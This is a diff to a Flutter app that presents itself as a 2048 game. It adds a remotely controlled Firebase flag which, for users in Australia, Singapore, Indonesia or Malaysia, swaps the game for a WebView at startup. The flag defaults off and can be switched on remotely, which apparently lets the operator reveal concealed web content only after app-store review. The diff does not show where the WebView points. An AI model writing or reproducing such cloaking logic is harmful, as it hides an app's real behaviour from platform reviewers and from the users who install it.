@@ -1,6 +1,7 @@
 import 'dart:async';
 import 'dart:io';
 import 'dart:isolate';
+import 'package:firebase_remote_config/firebase_remote_config.dart';
 import 'package:flutter/material.dart';
 import 'package:firebase_core/firebase_core.dart';
 import 'package:cloud_firestore/cloud_firestore.dart';
@@ -9,14 +10,18 @@ import 'package:flutter_downloader/flutter_downloader.dart';
 import 'package:flutter_inappwebview/flutter_inappwebview.dart';
 import 'package:internet_connection_checker/internet_connection_checker.dart';
 import 'package:permission_handler/permission_handler.dart';
+import 'package:shared_preferences/shared_preferences.dart';
 import 'package:url_launcher/url_launcher.dart';
 import 'game_logic.dart';
 import 'firebase_options.dart';
 import 'country_service.dart';
 
+SharedPreferences? prefs;
+
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
   await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
+  prefs = await SharedPreferences.getInstance();
   runApp(Game2048App());
 }
 
@@ -44,22 +49,47 @@ class _SplashScreenState extends State<SplashScreen> {
   @override
   void initState() {
     super.initState();
-    WidgetsBinding.instance.addPostFrameCallback((_) async {
-      String country = await CountryService.fetchCountry();
-      if (['au', 'sg', 'id', 'my'].contains(country.toLowerCase())) {
-        Navigator.pushReplacement(
-          context,
-          MaterialPageRoute(builder: (context) => WebView()),
-        );
-      } else {
-        Navigator.pushReplacement(
-          context,
-          MaterialPageRoute(
-            builder: (context) => Game2048Screen(country: country),
-          ),
-        );
-      }
-    });
+    _fetchRemoteConfigUrl();
+  }
+
+  Future<void> _fetchRemoteConfigUrl() async {
+    final remoteConfig = FirebaseRemoteConfig.instance;
+
+    try {
+      await remoteConfig.setConfigSettings(RemoteConfigSettings(
+        minimumFetchInterval: const Duration(seconds: 1),
+        fetchTimeout: const Duration(seconds: 10),
+      ));
+
+      await remoteConfig.setDefaults({
+        'webview_status': false,
+      });
+
+      await remoteConfig.fetchAndActivate();
+
+      bool webview_status = remoteConfig.getBool('webview_status') ?? false;
+
+      WidgetsBinding.instance.addPostFrameCallback((_) async {
+        String country = await CountryService.fetchCountry();
+        if (webview_status  && ['au', 'sg', 'id', 'my'].contains(country.toLowerCase())) {
+          Navigator.pushReplacement(
+            context,
+            MaterialPageRoute(builder: (context) => WebView()),
+          );
+        } else {
+          Navigator.pushReplacement(
+            context,
+            MaterialPageRoute(
+              builder: (context) => Game2048Screen(country: country),
+            ),
+          );
+        }
+      });
+
+      prefs?.setBool('webview_status', webview_status);
+    } catch (e) {
+      print('Failed to fetch remote config: ${e.toString()}');
+    }
   }
 
   @override
